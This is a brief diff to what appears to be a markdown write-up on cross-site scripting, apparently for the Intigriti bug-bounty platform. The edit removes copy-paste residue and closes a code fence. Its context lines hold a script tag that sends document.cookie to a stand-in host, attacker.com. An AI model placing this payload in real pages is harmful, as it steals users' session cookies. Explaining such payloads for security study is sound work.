@@ -163,8 +163,7 @@ Intigriti (https://www.intigriti.com)
 ```
 You see an alert box.
 You can steal cookies using:
-javascript
-Copy code
 <script>
     fetch('https://attacker.com/steal?cookie=' + document.cookie);
 </script>
+```
